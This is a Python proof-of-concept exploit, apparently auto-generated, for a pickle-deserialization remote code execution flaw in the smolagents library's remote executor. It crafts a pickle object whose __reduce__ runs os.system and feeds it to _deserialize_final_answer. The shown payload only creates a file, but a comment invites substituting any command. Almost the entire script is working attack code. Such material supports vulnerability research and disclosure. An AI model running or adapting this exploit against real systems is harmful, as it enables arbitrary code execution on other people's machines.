#!/usr/bin/env python3
# PoC for smolagents (/tmp/smolagents)
# Path: rce-013
# Sink: _deserialize_final_answer
# Auto-generated — run with: python3 rce_true_code_includes_pickle__deserialize_final_answer.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for smolagents RCE via pickle deserialization.

Vulnerability: The `_deserialize_final_answer` function in <remote_executors.py>
unconditionally calls `pickle.loads()` on user-controlled data when
`allow_pickle=True` and the payload starts with "pickle:".  An attacker who can
influence the final answer string (e.g., by providing a malicious `additional_args`
or tricking the remote executor into raising a `FinalAnswerException` with a
crafted evalue) can achieve arbitrary code execution.

This PoC triggers the vulnerable code path directly by calling
`_deserialize_final_answer` with a benign pickle payload that creates a file
`/tmp/poc_success.txt`.  In a real attack the payload would be delivered through
the agent's remote execution flow.

Run: python3 smolagents_poc.py
"""

import sys
import base64
import pickle
import os

# ---------------------------------------------------------------------------
# Configuration – change these to alter the target command or package location
# ---------------------------------------------------------------------------
# Path to the smolagents source (adjust if different)
SMOLAGENTS_PATH = "/tmp/smolagents/src"
# Benign payload – modify to your RCE command, but keep it safe for demonstration
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"

# ---------------------------------------------------------------------------
# Ensure the smolagents package is importable
# ---------------------------------------------------------------------------
sys.path.insert(0, SMOLAGENTS_PATH)

try:
    from smolagents.remote_executors import RemotePythonExecutor
except ImportError as e:
    print(f"[!] Failed to import smolagents from {SMOLAGENTS_PATH}: {e}")
    print("[!] Is the source directory correct?")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Build a malicious pickle payload
# ---------------------------------------------------------------------------
# We use a class that executes a system command when unpickled.
class Exploit:
    def __reduce__(self):
        # Return (callable, args) – `os.system` will be called with the command
        return (os.system, (PAYLOAD_COMMAND,))

def create_pickle_payload(command: str) -> str:
    """Return a "pickle:" prefixed, base64-encoded pickle payload."""
    payload = pickle.dumps(Exploit())
    b64_encoded = base64.b64encode(payload).decode()
    return f"pickle:{b64_encoded}"

# ---------------------------------------------------------------------------
# Trigger the vulnerability
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("[*] Building malicious pickle payload...")
    encoded_value = create_pickle_payload(PAYLOAD_COMMAND)
    print(f"[*] Payload (first 80 chars): {encoded_value[:80]}...")

    print("[*] Calling _deserialize_final_answer with allow_pickle=True...")
    try:
        result = RemotePythonExecutor._deserialize_final_answer(
            encoded_value, allow_pickle=True
        )
        print(f"[+] Deserialization returned: {result}")
    except Exception as e:
        print(f"[!] Exception during deserialization (this should not happen): {e}")
        sys.exit(1)

    # Verify the file was created
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt exists – command executed!")
    else:
        print("[?] File not found – the command may not have run (check permissions).")

    print("[*] PoC completed. Clean up with: rm -f /tmp/poc_success.txt")
